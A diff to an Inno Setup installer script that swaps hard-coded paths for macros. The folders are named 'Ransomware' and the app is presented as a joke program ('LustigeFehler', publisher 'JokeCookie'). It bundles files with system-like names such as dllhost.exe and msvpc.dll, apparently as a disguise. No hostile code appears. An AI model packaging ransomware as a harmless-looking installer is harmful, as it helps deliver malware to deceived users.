@@ -6,6 +6,8 @@
 #define MyAppPublisher "JokeCookie"
 #define MyAppURL "www.boerse.to"
 #define MyAppExeName "LustigeFehler.exe"
+#define MyPath "F:\TODO\C# und VB\Ransomware\BeforeSetup"
+#define MyOutputPath "F:\TODO\C# und VB\Ransomware\Setup"
 
 [Setup]
 ; NOTE: The value of AppId uniquely identifies this application.
@@ -24,10 +26,10 @@ AppUpdatesURL={#MyAppURL}
 DefaultDirName={pf}\{#MyAppName}
 DefaultGroupName={#MyAppName}
 AllowNoIcons=yes
-LicenseFile=C:\Users\tim\Desktop\Ransomware\BeforeSetup\License.txt
-OutputDir=C:\Users\tim\Desktop\Ransomware\Setup
+LicenseFile={#MyPath}\License.txt
+OutputDir={#MyOutputPath}
 OutputBaseFilename=LustigeFehler-Setup
-SetupIconFile=C:\Users\tim\Desktop\Ransomware\BeforeSetup\Funny.ico
+SetupIconFile={#MyPath}\Funny.ico
 Compression=lzma
 SolidCompression=yes
 
@@ -40,12 +42,12 @@ Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{
 Name: "quicklaunchicon"; Description: "{cm:CreateQuickLaunchIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked; OnlyBelowVersion: 0,6.1
 
 [Files]
-Source: "C:\Users\tim\Desktop\Ransomware\BeforeSetup\LustigeFehler.exe"; DestDir: "{app}"; Flags: ignoreversion
-Source: "C:\Users\tim\Desktop\Ransomware\BeforeSetup\Config.xml"; DestDir: "{app}"; Flags: ignoreversion
-Source: "C:\Users\tim\Desktop\Ransomware\BeforeSetup\dllhost.exe"; DestDir: "{app}"; Flags: ignoreversion
-Source: "C:\Users\tim\Desktop\Ransomware\BeforeSetup\Funny.ico"; DestDir: "{app}"; Flags: ignoreversion
-Source: "C:\Users\tim\Desktop\Ransomware\BeforeSetup\License.txt"; DestDir: "{app}"; Flags: ignoreversion
-Source: "C:\Users\tim\Desktop\Ransomware\BeforeSetup\msvpc.dll"; DestDir: "{app}"; Flags: ignoreversion
+Source: "{#MyPath}\LustigeFehler.exe"; DestDir: "{app}"; Flags: ignoreversion
+Source: "{#MyPath}\Config.xml"; DestDir: "{app}"; Flags: ignoreversion
+Source: "{#MyPath}\dllhost.exe"; DestDir: "{app}"; Flags: ignoreversion
+Source: "{#MyPath}\Funny.ico"; DestDir: "{app}"; Flags: ignoreversion
+Source: "{#MyPath}\License.txt"; DestDir: "{app}"; Flags: ignoreversion
+Source: "{#MyPath}\msvpc.dll"; DestDir: "{app}"; Flags: ignoreversion
 ; NOTE: Don't use "Flags: ignoreversion" on any shared system files
 
 [Icons]
